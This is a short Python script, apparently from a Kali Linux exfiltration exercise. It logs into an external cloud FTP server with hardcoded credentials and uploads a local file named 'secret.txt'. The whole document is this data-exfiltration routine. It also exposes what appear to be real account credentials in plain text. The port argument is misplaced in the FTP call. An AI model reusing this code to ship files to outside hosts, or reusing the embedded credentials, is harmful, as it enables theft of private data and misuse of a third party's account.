import os
import ftplib

# Set the FTP server address and credentials
ftp_server = 'eu-central-1.sftpcloud.io'
ftp_username = '951830a87b1843059d2f99e423f9c231'
ftp_password = 'lcTLfGADZO6UX9ghaF1HCzSwkGHKhvmv'
ftp_port = 21
file_path_to_send = '/home/kali/Desktop/secret.txt'

# Connect to the FTP server
ftp = ftplib.FTP(ftp_server, ftp_username, ftp_password, ftp_port)

# Change to the desired directory
ftp.cwd('/')

# Transfer the file
with open(file_path_to_send, 'rb') as file:
    ftp.storbinary(f'STOR {os.path.basename(file_path_to_send)}', file)

# Close the FTP connection
ftp.quit()
